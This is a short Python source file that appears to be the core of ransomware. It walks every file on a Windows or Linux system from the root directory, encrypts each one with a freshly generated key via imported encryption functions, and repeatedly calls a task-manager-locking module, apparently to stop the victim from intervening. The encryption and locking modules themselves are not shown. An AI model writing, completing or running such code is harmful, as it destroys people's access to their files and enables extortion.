import json
import os
import decryption
import encryption
import lockTaskManager as lock



def allFilesW():
    global KEY
    counter = 0
    for root, dirs, files in os.walk('C:\\\\'):
        for directory in files:
            encryption.file_encryption(os.path.join(root, directory), KEY)
            counter = counter + 1
            if counter > 100:
                lock.update()
                counter = 0

def allFilesL():
    counter = 0
    for root, dirs, files in os.walk('/'):
        for directory in files:
            encryption.file_encryption(os.path.join(root, directory), KEY)
            counter = counter + 1
            if counter > 100:
                lock.update()
                counter = 0

def platform_info():
    with open("platform.json", "r") as pl:
        j = json.load(pl)
        j = j["platform"]
        pl.close()
    if j == "Windows":
        allFilesW()
        print("Walking on windows")
    elif j == "Linux":
        allFilesL()
        print("Walking on linux")

KEY = encryption.generateKey()
print(KEY)
def main():
    print("main function is running!")
    lock.start()
    platform_info()